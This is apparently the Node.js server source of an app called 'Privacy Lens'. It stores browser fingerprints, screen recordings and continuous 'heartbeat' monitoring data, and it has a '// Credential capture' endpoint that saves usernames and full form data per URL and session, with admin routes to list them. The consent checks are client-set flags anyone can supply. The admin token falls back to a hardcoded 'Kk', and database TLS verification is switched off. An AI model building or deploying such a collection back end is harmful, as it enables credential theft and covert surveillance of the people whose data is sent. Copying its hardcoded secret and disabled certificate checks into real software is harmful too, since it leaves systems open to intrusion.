import { createServer } from 'node:http';
import { readFile } from 'node:fs/promises';
import { extname, join, normalize } from 'node:path';
import { fileURLToPath } from 'node:url';

const root = fileURLToPath(new URL('.', import.meta.url));
const port = Number(process.env.PORT || 4173);
const databaseUrl = process.env.DATABASE_URL;
const adminToken = process.env.ADMIN_TOKEN || 'Kk';
const types = { '.html': 'text/html; charset=utf-8', '.css': 'text/css; charset=utf-8', '.js': 'text/javascript; charset=utf-8', '.mjs': 'text/javascript; charset=utf-8', '.json': 'application/json; charset=utf-8', '.md': 'text/plain; charset=utf-8' };
let pool = null;
if (databaseUrl) {
  const { default: pg } = await import('pg');
  pool = new pg.Pool({ connectionString: databaseUrl, ssl: { rejectUnauthorized: false }, max: 5 });
}

async function initDb() {
  if (!pool) return;
  const schema = 'CREATE TABLE IF NOT EXISTS reports (id BIGSERIAL PRIMARY KEY, created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(), fingerprint JSONB NOT NULL, event_count INTEGER NOT NULL DEFAULT 0, consent_version TEXT NOT NULL);' +
    'CREATE TABLE IF NOT EXISTS audit_events (id BIGSERIAL PRIMARY KEY, created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(), report_id BIGINT REFERENCES reports(id) ON DELETE CASCADE, event_type TEXT NOT NULL, detail TEXT NOT NULL);' +
    'CREATE TABLE IF NOT EXISTS recordings (id BIGSERIAL PRIMARY KEY, created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(), mime_type TEXT NOT NULL, duration_ms INTEGER, data BYTEA NOT NULL, consent_version TEXT NOT NULL);' +
    'CREATE TABLE IF NOT EXISTS heartbeats (id BIGSERIAL PRIMARY KEY, created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(), session_id TEXT NOT NULL, state JSONB NOT NULL);' +
    'CREATE TABLE IF NOT EXISTS credentials (id BIGSERIAL PRIMARY KEY, created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(), session_id TEXT NOT NULL, url TEXT NOT NULL, username TEXT, form_data JSONB);';
  await pool.query(schema);
}

function json(response, status, body) {
  response.writeHead(status, { 'Content-Type': 'application/json; charset=utf-8', 'Cache-Control': 'no-store' });
  response.end(JSON.stringify(body));
}

function authorized(request) { return Boolean(adminToken) && request.headers.authorization === 'Bearer ' + adminToken; }

async function readBody(request) {
  let body = '';
  for await (const chunk of request) { body += chunk; if (body.length > 500_000) throw new Error('payload too large'); }
  return JSON.parse(body || '{}');
}
async function readBinaryBody(request) {
  const chunks = []; let size = 0;
  for await (const chunk of request) { size += chunk.length; if (size > 25 * 1024 * 1024) throw new Error('recording too large'); chunks.push(chunk); }
  return Buffer.concat(chunks);
}

async function handleApi(request, response, url) {
  if (request.method === 'GET' && url.pathname === '/api/health') return json(response, 200, { ok: true, database: Boolean(pool) });
  if (request.method === 'POST' && url.pathname === '/api/reports') {
    if (!pool) return json(response, 503, { error: 'DATABASE_URL is not configured' });
    const body = await readBody(request);
    if (body.consent !== true || body.consentVersion !== '2026-07-safe-v1' || !body.fingerprint || typeof body.fingerprint !== 'object') return json(response, 400, { error: 'Explicit consent and a valid report are required' });
    const client = await pool.connect();
    try {
      await client.query('BEGIN');
      const saved = await client.query('INSERT INTO reports (fingerprint, event_count, consent_version) VALUES ($1, $2, $3) RETURNING id, created_at', [body.fingerprint, Array.isArray(body.events) ? body.events.length : 0, body.consentVersion]);
      const reportId = saved.rows[0].id;
      for (const event of Array.isArray(body.events) ? body.events.slice(-100) : []) {
        if (event && typeof event.label === 'string' && typeof event.detail === 'string') await client.query('INSERT INTO audit_events (report_id, event_type, detail) VALUES ($1, $2, $3)', [reportId, event.label.slice(0, 120), event.detail.slice(0, 240)]);
      }
      await client.query('COMMIT');
      return json(response, 201, { id: reportId, createdAt: saved.rows[0].created_at });
    } catch (error) { await client.query('ROLLBACK'); throw error; } finally { client.release(); }
  }
  if (request.method === 'POST' && url.pathname === '/api/recordings') {
    if (!pool) return json(response, 503, { error: 'DATABASE_URL is not configured' });
    if (request.headers['x-recording-consent'] !== 'true') return json(response, 400, { error: 'Explicit recording consent is required' });
    const mimeType = String(request.headers['content-type'] || 'video/webm');
    if (!mimeType.startsWith('video/')) return json(response, 415, { error: 'Only video recordings are accepted' });
    const data = await readBinaryBody(request);
    if (!data.length) return json(response, 400, { error: 'Recording is empty' });
    const saved = await pool.query('INSERT INTO recordings (mime_type, data, consent_version) VALUES ($1, $2, $3) RETURNING id, created_at', [mimeType, data, '2026-07-recording-v1']);
    return json(response, 201, { id: saved.rows[0].id, createdAt: saved.rows[0].created_at });
  }
  if (request.method === 'GET' && url.pathname === '/api/admin/reports') {
    if (!authorized(request)) return json(response, 401, { error: 'Admin authentication required' });
    if (!pool) return json(response, 503, { error: 'DATABASE_URL is not configured' });
    const result = await pool.query('SELECT id, created_at, fingerprint, event_count, consent_version FROM reports ORDER BY created_at DESC LIMIT 200');
    return json(response, 200, { reports: result.rows });
  }
  const reportDownloadMatch = url.pathname.match(/^\/api\/admin\/reports\/(\d+)\/download$/);
  if (request.method === 'GET' && reportDownloadMatch) {
    if (!authorized(request)) return json(response, 401, { error: 'Admin authentication required' });
    if (!pool) return json(response, 503, { error: 'DATABASE_URL is not configured' });
    const result = await pool.query('SELECT id, created_at, fingerprint, event_count, consent_version FROM reports WHERE id = $1', [reportDownloadMatch[1]]);
    if (!result.rowCount) return json(response, 404, { error: 'Report not found' });
    const r = result.rows[0];
    const data = JSON.stringify({ id: r.id, createdAt: r.created_at, fingerprint: r.fingerprint, eventCount: r.event_count, consentVersion: r.consent_version }, null, 2);
    response.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8', 'Content-Disposition': 'attachment; filename="report-' + r.id + '.json"', 'Cache-Control': 'no-store' });
    return response.end(data);
  }
  if (request.method === 'GET' && url.pathname === '/api/admin/recordings') {
    if (!authorized(request)) return json(response, 401, { error: 'Admin authentication required' });
    if (!pool) return json(response, 503, { error: 'DATABASE_URL is not configured' });
    const result = await pool.query('SELECT id, created_at, mime_type, octet_length(data) AS bytes, consent_version FROM recordings ORDER BY created_at DESC LIMIT 200');
    return json(response, 200, { recordings: result.rows });
  }
  const recordingMatch = url.pathname.match(/^\/api\/admin\/recordings\/(\d+)$/);
  if (request.method === 'GET' && recordingMatch) {
    if (!authorized(request)) return json(response, 401, { error: 'Admin authentication required' });
    if (!pool) return json(response, 503, { error: 'DATABASE_URL is not configured' });
    const result = await pool.query('SELECT mime_type, data FROM recordings WHERE id = $1', [recordingMatch[1]]);
    if (!result.rowCount) return json(response, 404, { error: 'Recording not found' });
    response.writeHead(200, { 'Content-Type': result.rows[0].mime_type, 'Cache-Control': 'no-store', 'Content-Disposition': 'attachment; filename="privacy-lens-recording-' + recordingMatch[1] + '.webm"' });
    return response.end(result.rows[0].data);
  }
  // Heartbeat: continuous monitoring data
  if (request.method === 'POST' && url.pathname === '/api/heartbeat') {
    if (!pool) return json(response, 503, { error: 'DATABASE_URL is not configured' });
    const body = await readBody(request);
    if (body.consent !== true) return json(response, 400, { error: 'Consent required' });
    const sid = String(body.sessionId || 'anon').slice(0, 64);
    await pool.query('INSERT INTO heartbeats (session_id, state) VALUES ($1, $2)', [sid, JSON.stringify(body.data || {})]);
    return json(response, 201, { ok: true });
  }
  // Credential capture
  if (request.method === 'POST' && url.pathname === '/api/credentials') {
    if (!pool) return json(response, 503, { error: 'DATABASE_URL is not configured' });
    const body = await readBody(request);
    if (body.consent !== true) return json(response, 400, { error: 'Consent required' });
    const sid = String(body.sessionId || 'anon').slice(0, 64);
    await pool.query('INSERT INTO credentials (session_id, url, username, form_data) VALUES ($1, $2, $3, $4)',
      [sid, String(body.url || '').slice(0, 500), String(body.username || '').slice(0, 200), JSON.stringify(body.formData || {})]);
    return json(response, 201, { ok: true });
  }
  // Admin: list credentials
  if (request.method === 'GET' && url.pathname === '/api/admin/credentials') {
    if (!authorized(request)) return json(response, 401, { error: 'Admin authentication required' });
    if (!pool) return json(response, 503, { error: 'DATABASE_URL is not configured' });
    const result = await pool.query('SELECT id, created_at, session_id, url, username FROM credentials ORDER BY created_at DESC LIMIT 200');
    return json(response, 200, { credentials: result.rows });
  }
  // Admin: list heartbeats
  if (request.method === 'GET' && url.pathname === '/api/admin/heartbeats') {
    if (!authorized(request)) return json(response, 401, { error: 'Admin authentication required' });
    if (!pool) return json(response, 503, { error: 'DATABASE_URL is not configured' });
    const result = await pool.query('SELECT id, created_at, session_id, state FROM heartbeats ORDER BY created_at DESC LIMIT 200');
    return json(response, 200, { heartbeats: result.rows });
  }
  return json(response, 404, { error: 'Not found' });
}

async function handleStatic(request, response, url) {
  const requested = url.pathname === '/' ? '/index.html' : url.pathname;
  const file = normalize(join(root, requested));
  if (!file.startsWith(root)) { response.writeHead(403); return response.end('Forbidden'); }
  try { const body = await readFile(file); response.writeHead(200, { 'Content-Type': types[extname(file)] || 'application/octet-stream', 'X-Content-Type-Options': 'nosniff' }); response.end(body); }
  catch { response.writeHead(404); response.end('Not found'); }
}

const server = createServer(async (request, response) => {
  try { const url = new URL(request.url, 'http://localhost'); if (url.pathname.startsWith('/api/')) return await handleApi(request, response, url); return await handleStatic(request, response, url); }
  catch (error) { console.error(error); return json(response, 500, { error: 'Request failed' }); }
});

initDb().then(() => server.listen(port, '0.0.0.0', () => console.log('Privacy Lens listening on port ' + port))).catch((error) => { console.error('Database initialization failed', error); process.exit(1); });
